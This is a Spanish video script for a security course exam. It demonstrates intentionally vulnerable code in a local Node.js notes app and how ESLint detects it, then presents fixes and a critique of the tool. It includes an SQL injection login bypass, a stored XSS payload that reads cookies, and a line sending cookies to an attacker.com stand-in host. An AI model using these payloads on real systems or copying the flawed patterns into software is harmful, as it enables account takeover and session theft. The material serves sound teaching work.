# GUIÓN PARA VIDEO — Parcial SSF
## "Mis Notas Personales" — Análisis de Vulnerabilidades con ESLint
### Total aprox: 15 minutos (2 partes de ~7-8 min cada una)

---

# VIDEO 2a (~7-8 min) — Demostración de Vulnerabilidades Reales

---

## [0:00 – 0:30] Introducción rápida

> "Vamos a analizar la app 'Mis Notas Personales' — Node.js + Express + SQLite. Tiene 5 vulnerabilidades intencionales en dos archivos: `app.js` y `auth.js`. Las vamos a ver con ESLint y en vivo."

**[MOSTRAR estructura en terminal]**

```
backend/routes/auth.js    ← SQL Injection, Hardcoded Secret
frontend/js/app.js        ← XSS, eval(), setTimeout, Prototype Pollution
```

---

## [0:30 – 1:30] Levantar la app

**[TERMINAL]**

```powershell
npm install
npm start
```

**[ABRIR navegador → http://localhost:3000]**

> "Tenemos login, registro y dashboard de notas. Esta es la superficie de ataque."

---

## [1:30 – 3:00] Vulnerabilidad 1 — SQL Injection (`auth.js:55`)

**[ABRIR `backend/routes/auth.js` línea 55]**

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE username = '${username}'`;
const result = db.exec(query);
```

> "El username se concatena directo en la query SQL. Si mando `' OR '1'='1` como usuario, la query queda:"

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

> "Siempre verdadero — entra sin contraseña. Bypass de autenticación. **OWASP A03:2021 – Injection**."

**[DEMOSTRAR en Postman o formulario del navegador]**
- Username: `' OR '1'='1` / Password: `cualquiera`
- Mostrar que el login tiene éxito

> "ESLint NO detectó esto — el plugin no tiene regla para SQL Injection por concatenación."

---

## [3:00 – 4:30] Vulnerabilidad 2 — XSS via innerHTML (`app.js:206`)

**[ABRIR `frontend/js/app.js` línea 206]**

```javascript
// ❌ VULNERABLE
notesList.innerHTML = html; // html contiene datos del usuario sin sanitizar
```

> "Crear nota con título malicioso:"

```html
<img src=x onerror="alert('XSS: ' + document.cookie)">
```

**[DEMOSTRAR en navegador]**
1. Crear la nota con ese título
2. Volver al dashboard — se dispara el alert con la cookie

> "XSS Stored. Roba sesiones, redirige usuarios. ESLint sí lo detectó con `custom/no-innerhtml`."

---

## [4:30 – 5:30] Vulnerabilidades 3 y 4 — eval() y setTimeout(string)

**[ABRIR `app.js` línea 381 y 262]**

```javascript
// ❌ VULNERABLE — eval() con input del usuario
window.evaluateNoteExpression = function(expression) {
  return eval(expression); // ejecuta código arbitrario
};

// ❌ VULNERABLE — setTimeout con string (= eval)
const searchValue = currentSearch;
setTimeout(`console.log('Búsqueda: ${searchValue}');`, 300);
```

**[DEMOSTRAR en consola del navegador]**

```javascript
evaluateNoteExpression("document.cookie")
evaluateNoteExpression("fetch('http://attacker.com?d='+document.cookie)")
```

> "La segunda es peor: el valor del buscador se interpola en el string — si el usuario escribe código, se ejecuta. Ambas son **OWASP A03:2021**. ESLint detectó las dos."

---

## [5:30 – 6:30] Vulnerabilidad 5 — Prototype Pollution (`app.js:402`)

**[ABRIR `app.js` línea 402]**

```javascript
// ❌ VULNERABLE — Object.assign sin sanitizar keys
window.updateUserConfig = function(newConfig) {
  const updatedConfig = Object.assign(currentConfig, newConfig);
};
```

**[DEMOSTRAR en consola]**

```javascript
updateUserConfig(JSON.parse('{"__proto__": {"admin": true}}'));
console.log({}.admin); // true — prototipo contaminado
```

> "Todos los objetos ahora tienen `admin: true`. Permite bypassear validaciones de rol. ESLint lo detectó con `custom/no-prototype-pollution`."

---

## [6:30 – 7:30] Ejecutar ESLint — resumen total

**[TERMINAL]**

```powershell
npm run lint
```

**[MOSTRAR salida]**

```
app.js:175   error  XSS: innerHTML                    custom/no-innerhtml
app.js:206   error  XSS: innerHTML                    custom/no-innerhtml
app.js:262   error  setTimeout with string            custom/no-settimeout-string
app.js:308   error  Prototype Pollution               custom/no-prototype-pollution
app.js:350   error  setTimeout with string            custom/no-settimeout-string
app.js:381   error  eval with expression              security/detect-eval-with-expression
app.js:391   error  Prototype Pollution               custom/no-prototype-pollution
app.js:402   error  Prototype Pollution               custom/no-prototype-pollution
app.js:414   error  eval with expression              security/detect-eval-with-expression

✖ 17 problems (9 errors, 8 warnings)
```

> "9 errores, todos de seguridad. SQL Injection y Hardcoded Secret no aparecen — eso lo analizamos en el siguiente video."

---
---

# VIDEO 2b (~7-8 min) — Corrección y Análisis Crítico

---

## [0:00 – 0:20] Intro

> "Aquí vamos a corregir cada vulnerabilidad comparando el archivo original con su versión `.fixed.js`, y luego análisis crítico de ESLint: qué detectó, qué no, y los falsos positivos."

---

## [0:20 – 3:30] Correcciones — Archivo `.fixed` vs original

**[ABRIR en VS Code `auth.js` y `auth.fixed.js` lado a lado]**

### Fix 1 — SQL Injection

```javascript
// ❌ auth.js:55
const query = `SELECT * FROM users WHERE username = '${username}'`;
db.exec(query);

// ✅ auth.fixed.js
const query = `SELECT * FROM users WHERE username = ?`;
db.exec(query, [username]); // username como parámetro separado, no como código SQL
```

> "Un `?` y un array. El driver escapa el valor automáticamente — nunca entra a la query como texto."

### Fix 2 — Hardcoded Secret

```javascript
// ❌ auth.js:7
const JWT_SECRET = 'secret-key-demo';

// ✅ auth.fixed.js
const JWT_SECRET = process.env.JWT_SECRET || 'change-me-in-production';
```

> "La clave sale del código y vive en una variable de entorno del servidor."

---

**[ABRIR `app.js` y `app.fixed.js` lado a lado]**

### Fix 3 — XSS

```javascript
// ❌ app.js:206
notesList.innerHTML = html;

// ✅ app.fixed.js
const h3 = document.createElement('h3');
h3.textContent = note.title; // texto plano — no interpreta HTML
notesList.appendChild(h3);
```

> "`textContent` nunca ejecuta tags HTML. El `<script>` del atacante se muestra como texto."

### Fix 4 — eval()

```javascript
// ❌ app.js:381
return eval(expression);

// ✅ app.fixed.js — validar como expresión matemática
if (!/^[\d\s+\-*/().]+$/.test(expression)) return 'Expresión no permitida';

// ❌ app.js:414
return notes.filter(note => eval(searchExpr));

// ✅ app.fixed.js
return notes.filter(note => note.title.toLowerCase().includes(term));
```

### Fix 5 — setTimeout y Prototype Pollution

```javascript
// ❌ setTimeout con string
setTimeout(`console.log('Búsqueda: ${searchValue}');`, 300);

// ✅ Arrow function — searchValue en closure, nunca en string ejecutable
setTimeout(() => { console.log('Búsqueda:', searchValue); }, 300);

// ❌ Object.assign sin sanitizar
Object.assign(currentConfig, newConfig);

// ✅ Filtrar keys peligrosas primero
const forbiddenKeys = ['__proto__', 'constructor', 'prototype'];
const safeConfig = Object.fromEntries(
  Object.entries(newConfig).filter(([k]) => !forbiddenKeys.includes(k))
);
Object.assign(currentConfig, safeConfig);
```

---

## [3:30 – 5:30] Qué NO detectó ESLint y por qué

> "Aquí viene lo más importante del análisis crítico."

**SQL Injection — no detectado:**
> "ESLint analiza sintaxis JavaScript, no semántica de SQL. No sabe que el resultado de un template literal va a ejecutarse como query. Para SQL Injection se necesita análisis de flujo de datos o herramientas como **Semgrep** o testing dinámico con **sqlmap**."

**Hardcoded Secrets — no detectado:**
> "El plugin tampoco tiene regla para credenciales en el código. Para eso existen herramientas como **truffleHog** o **detect-secrets**, o se puede escribir una regla custom que busque strings asignados a variables con nombres como `SECRET`, `PASSWORD`, `TOKEN`."

**[MOSTRAR auth.js:7 — ESLint no lo marcó]**

> "Estas dos vulnerabilidades pasarían a producción sin que ESLint diga nada. Por eso ESLint no es suficiente solo."

---

## [5:30 – 6:45] Fortalezas, Limitaciones y Falsos Positivos

### Fortalezas
- Detecta `eval()`, `innerHTML`, `setTimeout(string)`, Prototype Pollution con reglas custom
- Feedback en tiempo real en VS Code
- Se integra en CI/CD — puede bloquear el build si hay errores de seguridad
- Las reglas custom nos dieron 7 errores adicionales que el plugin base no habría encontrado

### Limitaciones
- No entiende flujo de datos: no sabe si una variable viene del usuario o de una fuente interna
- No detecta SQL Injection ni Hardcoded Secrets
- Solo análisis estático — no ve vulnerabilidades en runtime o de lógica de negocio

### Falsos Positivos

**[MOSTRAR `auth.js:66` y `notes.js:30`]**

```javascript
// ESLint marcó warning: "Generic Object Injection Sink"
columns.forEach((col, i) => { user[col] = row[i]; });
```

> "ESLint ve `user[col]` con key dinámica y asume riesgo. Pero `col` viene de las columnas de la base de datos — fuente interna confiable. Falso positivo."

**[MOSTRAR `app.js:85`]**

```javascript
if (password !== confirmPassword) // Warning: "Potential timing attack"
```

> "Comparación de strings en formulario del cliente, no criptografía. Otro falso positivo — el bcrypt seguro ya corre en el servidor."

---

## [6:45 – 7:30] Conclusión y tabla final

**[MOSTRAR tabla]**

| Vulnerabilidad | ESLint detectó | Herramienta adecuada |
|---|---|---|
| XSS via innerHTML | ✅ Sí | `custom/no-innerhtml` |
| eval() | ✅ Sí | `security/detect-eval-with-expression` |
| setTimeout(string) | ✅ Sí | `custom/no-settimeout-string` |
| Prototype Pollution | ✅ Sí | `custom/no-prototype-pollution` |
| SQL Injection | ❌ No | Semgrep / sqlmap |
| Hardcoded Secret | ❌ No | truffleHog / detect-secrets |

> "ESLint con reglas custom detectó el 100% de las vulnerabilidades JavaScript del frontend. Para backend e inyecciones a nivel de protocolo se necesitan herramientas complementarias. La seguridad en profundidad requiere capas — ESLint es una capa importante, no la única."

---

*Total estimado: ~15 minutos | Video 2a: ~7-8 min | Video 2b: ~7-8 min*
